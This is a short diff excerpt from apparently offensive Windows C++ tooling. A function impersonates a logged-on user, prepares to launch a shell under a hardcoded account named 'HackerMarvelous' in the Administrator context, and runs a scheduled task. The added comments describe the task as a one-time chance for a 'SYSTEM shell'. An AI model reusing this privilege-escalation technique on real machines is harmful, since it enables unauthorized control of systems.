@@ -127,7 +127,7 @@ DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam) {
 	}
 	std::cout << "ImpersonateLoggedOnUser succeeded.. " << std::endl;
 	PrintSecurityContext();
-	/* // Launch a shell on the desktop
+	/* // Launch a shell on the desktop, use this for running commands in the Administrator security context.
 	STARTUPINFOW si = {sizeof(si)};
 	PROCESS_INFORMATION pi;
 	LPCWSTR username = L"HackerMarvelous";
@@ -381,6 +381,8 @@ DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam) {
 	std::cout << "Task created successfully." << std::endl;
 	IRunningTask* pRunningTask = NULL;
 	hr = pRegisteredTask->Run(_variant_t(), &pRunningTask);
+	// You only get one shot, do not miss your chance to blow, this SYSTEM
+	// shell opportunity comes around once in a boxes lifetime yo...
 	if (FAILED(hr)) {
 		std::cout << "IRegisteredTask::Run failed. Error: " << hr << std::endl;
 		pRegisteredTask->Release();
